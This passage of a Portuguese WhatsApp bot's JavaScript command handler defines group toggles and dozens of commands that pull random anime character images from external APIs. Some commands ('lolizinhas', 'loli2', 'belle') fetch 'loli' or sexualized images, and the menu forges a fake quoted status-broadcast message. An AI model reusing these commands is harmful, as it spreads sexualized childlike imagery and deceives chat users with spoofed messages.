if (isWelcome) return reply('*[❗] ja esta ativado nii-san*')
welcome.push(from)
fs.writeFileSync('./arquivos/welcome.json', JSON.stringify(welcome))
reply(mess.only.tobireplay)
} else if (args[0] === 'desativar') {
let position = welcome.indexOf(welcome.find((x) => x === from))
if (position === -1) return reply(`${command} não estava ativo antes`)
welcome.splice(position, 1)
fs.writeFileSync('./arquivos/welcome.json', JSON.stringify(welcome))
reply(mess.only.tobireplayoff)
} else {
reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
}
break

case 'antitxt':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (args.length < 1) return reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
if (args[0] === 'ativar') {
if (isAntitexto) return reply('*[❗] ja esta ativado nii-san*')
antitexto.push(from)
fs.writeFileSync('./arquivos/antitexto.json', JSON.stringify(antitexto))
reply(mess.only.tobireplay)
} else if (args[0] === 'desativar') {
antitexto.splice(from, 1)
fs.writeFileSync('./arquivos/antitexto.json', JSON.stringify(antitexto))
reply(mess.only.tobireplayoff)
} else {
reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
}
break 
/* ===================================================[ ${NomeDoMenu} ]==============================================================*/    

/*===================================================[ ${NomeDoMenu} ]==============================================================*/    

/*case 'animes':
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isModoanime) return reply(ptbr.modoanime())
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const animes = {
text:
 `
  ${ucapanFakereply}
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ 𝙼𝚎𝚗𝚞 𝚍𝚎 𝚊𝚗𝚒𝚖𝚎𝚜
┃⋆│ Ignore Os Emojis, E Só Para Enfeite
┃⋆│💎➢ ${prefix}Anime ⟨🌸⟩
┃⋆│➥Fotos de animes. 
┃⋆│💎➢ ${prefix}Wp ⟨💎⟩
┃⋆│➥ Fotos de animes. 
┃⋆│💎➢ ${prefix}Wallpaper2 ⟨👻⟩
┃⋆│➥ Wallpapers
┃⋆│💎➢ ${prefix}Lolizinhas ⟨🧸⟩
┃⋆│➥ Fotos de lolis. ⟩
┃⋆│💎➢ ${prefix}Neko ⟨💫⟩
┃⋆│➥ Fotos anime neko 
┃⋆│💎➢ ${prefix}Hinata ⟨💖⟩
┃⋆│➥ Fotos da hinata 
┃⋆│💎➢ ${prefix}Nezuko ⟨🧝🏽‍♀️⟩
┃⋆│➥ Fotos da nezuko 
┃⋆│💎➢ ${prefix}Belle ⟨😳⟩
┃⋆│➥ Fotos da belle
┃⋆│💎➢ ${prefix}Sasuke ⟨💮⟩
┃⋆│➥ Fotos do sasuke 
┃⋆│💎➢ ${prefix}Sakura ⟨🌀⟩
┃⋆│➥ Fotos da sakura 
┃⋆│💎➢ ${prefix}Naruto ⟨🔥⟩
┃⋆│➥ Fotos do naruto 
┃⋆│💎➢ ${prefix}Kanna ⟨💥⟩
┃⋆│➥ Fotos da kanna 
┃⋆│💎➢ ${prefix}Poze ⟨🎵⟩
┃⋆│➥ Fotos do mc poze 
┃⋆│💎➢ ${prefix}Luffy ⟨🌌⟩
┃⋆│➥ Fotos do luffy 
┃⋆│💎➢ ${prefix}Zoro ⟨🗡️⟩
┃⋆│➥ Fotos do zoro 
┃⋆│💎➢ ${prefix}Tobi ⟨😏⟩
┃⋆│➥ Fotos do tobi-chan 
┃⋆│💎➢ ${prefix}Loli2 ⦗👾⦘
┃⋆│➥ Fotos de lolis 
┃⋆│💎➢ ${prefix}Waifu ⦗🌀⦘
┃⋆│➥ Fotos de waifus 
┃⋆│💎➢ ${prefix}Waifu2 ⦗🌀⦘
┃⋆│➥ Fotos de waifu2 
┃⋆│💎➢ ${prefix}Tanjiro ⦗❤️⦘
┃⋆│➥ Fotos do Tanjiro 
┃⋆│💎➢ ${prefix}Nezuko ⦗😬⦘
┃⋆│➥ Fotos da nezuco 
┃⋆│💎➢ ${prefix}Inosuke ⦗🐒⦘
┃⋆│➥ Fotos do inosuke 
┃⋆│💎➢ ${prefix}Zenitsu ⦗🔥⦘
┃⋆│➥ Fotos do zenitsu 
┃⋆│💎➢ ${prefix}Genya ⦗😋⦘
┃⋆│➥ Fotos do genya 
┃⋆│💎➢ ${prefix}Kanao ⦗💮⦘
┃⋆│➥ Fotos da Kanao 
┃⋆│💎➢ ${prefix}Hashiras ⦗??⦘
┃⋆│➥ Fotos dos hashiras
┃⋆│💎➢ ${prefix}Kyojuro ⦗💮⦘
┃⋆│➥ Fotos do kyojuro 
┃⋆│💎➢ ${prefix}Tengen ⦗🦹⦘
┃⋆│➥ Fotos do tengen 
┃⋆│💎➢ ${prefix}Mitsuri ⦗??⦘
┃⋆│➥ Fotos da mitsuri 
┃⋆│💎➢ ${prefix}Obanai ⦗🐍⦘
┃⋆│➥ Fotos do obanai 
┃⋆│💎➢ ${prefix}Madara ⦗👾⦘
┃⋆│➥ Fotos do madara 
┃⋆│💎➢ ${prefix}Itachi ⦗😬⦘
┃⋆│➥ Fotos do itachi 
┃⋆│💎➢ ${prefix}Kakashi ⦗💖⦘
┃⋆│➥ Fotos do kakashi 
┃⋆│💎➢ ${prefix}Obito ⦗😎⦘
┃⋆│➥ Fotos do obito 
┃⋆│💎➢ ${prefix}Sakura ⦗💐⦘
┃⋆│➥ Fotos da sakura 
┃⋆│💎➢ ${prefix}Minato ⦗🍃⦘
┃⋆│➥ Fotos do minato 
┃⋆│💎➢ ${prefix}Jiraiya ⦗🌀⦘
┃⋆│➥ Fotos do jiraiya 
┃⋆│💎➢ ${prefix}Gaara ⦗⛱️⦘
┃⋆│➥ Fotos do gaara 
┃⋆│💎➢ ${prefix}Tsunade ⦗🌟⦘
┃⋆│➥ Fotos da tsunade
┃⋆│💎➢ ${prefix}Deidara ⦗😎⦘
┃⋆│➥ Fotos do deidara 
┃⋆│💎➢ ${prefix}Shikamaro ⦗👾⦘
┃⋆│➥ Fotos do shikamaro 
┃⋆│💎➢ ${prefix}Ino ⦗🌀⦘
┃⋆│➥ Fotos da ino 
┃⋆│💎➢ ${prefix}Orochimaru ⦗🔥⦘
┃⋆│➥ Fotos do orochimaru 
┃⋆│💎➢ ${prefix}Neji ⦗❤️⦘
┃⋆│➥ Fotos do neji 
┃⋆│💎➢ ${prefix}Sasori ⦗😬⦘
┃⋆│➥ Fotos do sasori 
┃⋆│💎➢ ${prefix}Nagatoro ⦗😳⦘
┃⋆│➥ Fotos da nagatoro 
┃⋆│💎➢ ${prefix}Kilua ⦗🤪⦘
┃⋆│➥ Fotos do killua 
┃⋆│💎➢ ${prefix}Deku ⦗☄️⦘
┃⋆│➥ Fotos do deku 
┃⋆│💎➢ ${prefix}Allmight ⦗💪⦘
┃⋆│➥ Fotos do allmight 
┃⋆│💎➢ ${prefix}Katsuki ⦗🐰⦘
┃⋆│➥ Fotos do katsuki 
┃⋆│💎➢ ${prefix}Tenya ⦗🔥⦘
┃⋆│➥ Fotos do tenya 
┃⋆│💎➢ ${prefix}Ochaco ⦗☔⦘
┃⋆│➥ Fotos da ochaco 
┃⋆│💎➢ ${prefix}Minoru ⦗💎⦘
┃⋆│➥ Fotos da minoru 
┃⋆│💎➢ ${prefix}Ashido ⦗??⦘
┃⋆│➥ Fotos da ashido 
┃⋆│💎➢ ${prefix}Shoto ⦗👨🏽‍✈️⦘
┃⋆│➥ Fotos do shoto 
┃⋆│💎➢ ${prefix}Tsuyu ⦗🐤⦘
┃⋆│➥ Fotos da tsuyu 
┃⋆│💎➢ ${prefix}Denki ⦗👾⦘
┃⋆│➥ Fotos do denki 
┃⋆│💎➢ ${prefix}Eijiro ⦗😎⦘
┃⋆│➥ Fotos do eijiro 
┃⋆│💎➢ ${prefix}Fumikage ⦗🍬⦘
┃⋆│➥ Fotos do fumikage 
┃⋆│💎➢ ${prefix}Yaoyorozu ⦗🌜⦘
┃⋆│➥ Fotos do yaoyorozu 
┃⋆│💎➢ ${prefix}Itsuka ⦗🐈⦘
┃⋆│➥ Fotos da itsuka 
┃⋆│💎➢ ${prefix}Neito ⦗🎉⦘
┃⋆│➥ Fotos do neito 
┃⋆│💎➢ ${prefix}Mei ⦗👀⦘
┃⋆│➥ Fotos do mei
┃⋆│💎➢ ${prefix}neko2 ⦗??⦘
┃⋆│➥ Fotos da neko 
┃⋆╰───────────────────
╰━════════════════════⊷
`,
contextInfo: {mentionedJid: [sender]}}
loli.sendMessage(from, animes, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `${cr}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./database/help/bot.jpg')}}}})
bufe1 = fs.readFileSync('./database/audios/menuzin.mp3')
loli.sendMessage(from, bufe1, audio, {mimetype: 'audio/mp4', ptt:true})
break

case 'anime':
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["anime tumblr",
"wallpaper anime hd",
"anime aestethic",
"anime hd"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(ptbr.wait())
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
quoted: say1, caption: `💮`
})
break

//_PROCURA WALLPAPER NO PINTEREST
case 'wp':
case 'wallpaper':
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
pw = ["wallpaper aestethic",
"wallpaper tumblr",
"wallpaper lucu",
"wallpaper"]
nk = pw[Math.floor(Math.random() * pw.length)]
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(ptbr.wait())
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
quoted: say1, caption: `Gostou do que escolhi?`
})
} catch {
reply(ptbr.erro())
}
break
case 'wallpaper2':
try {
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
reply(ptbr.wait())
axios.get('https://akaneko-api.herokuapp.com/api/wallpapers').then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
loli.sendMessage(from, buf, MessageType.image, {quoted: say1})
})
})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌ocorreu um erro❌\n\nTente novamente. ')
}
break

case 'lolizinhas': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
reply(mess.only.tobianime)
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/neko`)
loli.sendMessage(from, buffer, image, {quoted: say1})
break

//_NEKOS PINTEREST
case 'neko': 
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
uk = ["anime neko"]
nk = uk[Math.floor(Math.random() * uk.length)]
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(ptbr.wait())
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
quoted: say1, caption: `nyan`
})
} catch {
reply(ptbr.erro())
}
break

case 'hinata':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Hinata Hyuga"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://fdz-app.herokuapp.com/api/pinterest?q=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'nezuko':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Nezuko Kamado"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'belle':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
pw = ["belle delphine",
"belle delphine hot",
"belle delphine anime"]
nk = pw[Math.floor(Math.random() * pw.length)]
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
quoted: say1, caption: `Fotos da ${command}`
})
} catch {
reply(ptbr.erro())
}
break

case 'naruto':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
pw = ["naruto wallpaper",
"naruto uzumaki",
"naruto uzumaki shippude"]
nk = pw[Math.floor(Math.random() * pw.length)]
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
quoted: say1, caption: `Fotos do ${command}`
})
} catch {
reply(ptbr.erro())
}
break

case 'kanna':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
pw = ["kanna kamui",
"kanna kamui icon",
"kanna kamui cospla"]
nk = pw[Math.floor(Math.random() * pw.length)]
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
quoted: say1, caption: `Fotos da ${command}`
})
} catch {
reply(ptbr.erro())
}
break

case 'poze':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
pw = ["mc poze",
"mc poze do rodo",
"mc poze animes"]
nk = pw[Math.floor(Math.random() * pw.length)]
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
quoted: say1, caption: `Fotos do ${command}`
})
} catch {
reply(ptbr.erro())
}
break

case 'luffy':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
pw = ["luffy",
"monkey d. luffy",
"monkey d luffy icon aesthetic",
"monkey d. luffy icon"]
nk = pw[Math.floor(Math.random() * pw.length)]
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
quoted: say1, caption: `Fotos do ${command}`
})
} catch {
reply(ptbr.erro())
}
break

case 'zoro':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
pw = ["zoro",
"roronoa zoro",
"roronoa zoro wallpaper",
"roronoa zoro wano",
"roronoa zoro wallpapers iphone 4k"]
nk = pw[Math.floor(Math.random() * pw.length)]
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
quoted: say1, caption: `Fotos do ${command}`
})
} catch {
reply(ptbr.erro())
}
break

case 'tobi':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
pw = ["tobi",
"tobi akatsuki",
"tobi icon",
"tobi wallpapers"]
nk = pw[Math.floor(Math.random() * pw.length)]
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
quoted: say1, caption: `Fotos do ${command}`
})
} catch {
reply(ptbr.erro())
}
break

case 'sakura':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Sakura Haruno"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'loli2':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["lolis fofas"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
quoted: say, caption: `loli!!`
})
break

case 'waifu2':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["waifu anime fofa"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
quoted: say, caption: `waifu!!`
})
break

case 'tanjiro':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Tanjiro Kamado"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'inosuke':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Inosuke Hashibira"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'zenitsu':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Zenitsu Agatsuma"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'genya':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Genya Shinazugawa"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'kanao':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Kanao Tsuyuri"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'hashiras':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Giyuu Tomioka (Hashira da Água)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'kyojuro':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Kyojuro Rengoku (Hashira das Chamas)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'tengen':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Tengen Uzui (Hashira do Som)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'mitsuri':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Mitsuri Kanroji (Hashira do Amor)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'obanai':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Obanai Iguro (Hashira da Serpente)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'madara':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Madara Uchiha"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'itachi':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Itachi Uchiha"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'kakashi':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Kakashi Hatake"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'obito':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Obito Uchiha"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'minato':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Minato Namikaze"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'jiraiya':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Jiraiya"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'gaara':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Gaara da areia"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'tsunade':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Tsunade Senju"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'deidara':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Deidara"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'shikamaro':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Shikamaru Nara"]
nk = am[Math.floor(Math.random() * am.length)]
